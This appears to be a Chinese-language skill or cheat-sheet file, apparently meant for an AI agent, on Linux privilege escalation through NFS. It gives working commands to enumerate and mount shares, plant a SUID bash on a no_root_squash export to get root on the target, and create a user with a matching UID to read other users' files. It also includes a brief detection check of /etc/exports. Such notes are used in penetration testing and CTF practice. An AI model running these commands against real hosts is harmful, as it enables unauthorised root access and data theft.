---
name: 'nfs-privesc'
description: 'NFS提权：no_root_squash→SUID bash。UID匹配绕过文件权限。showmount枚举。'
disable-model-invocation: true
metadata: { domain: linux, tier: T2 }
---

## NFS 提权

### 识别
- `showmount -e target`
- `/etc/exports` 内容（在已控主机上）

### 挂载远程 NFS
```bash
showmount -e target                   # 列出共享
mkdir /tmp/nfs; mount -t nfs target:/share /tmp/nfs
# 如果挂载失败 → 检查版本
mount -t nfs target:/share /tmp/nfs -o vers=3
```text

### no_root_squash 提权
```bash
# 条件: /etc/exports 中共享有 no_root_squash 选项
# 本地 root → 远程 root

# 1. 本地创建 SUID bash
cp /bin/bash /tmp/nfs/rootbash
chown root:root /tmp/nfs/rootbash
chmod 4755 /tmp/nfs/rootbash

# 2. 目标机器上执行
/tmp/nfs/rootbash -p    # -p 保留 euid
# → root

# 如果 root 被 squash 但 no_all_squash → 用相同 uid 的用户
useradd -u <target_uid> attacker
su attacker
cd /tmp/nfs
./rootbash -p
```text

### NFS 读限制文件
```bash
# NFS 不遵守 Unix 文件权限（基于 uid/gid 匹配）
# 如果知道目标的 UID → 本地创建同 UID 用户
useradd -u 1001 victim
su victim
cat /tmp/nfs/home/victim/user.txt
```text

### 检测
```bash
# 在目标机器上
cat /etc/exports
# /share *(rw,no_root_squash)        ← 危险
# /share *(rw,sync)                  ← root_squash（安全）
```text
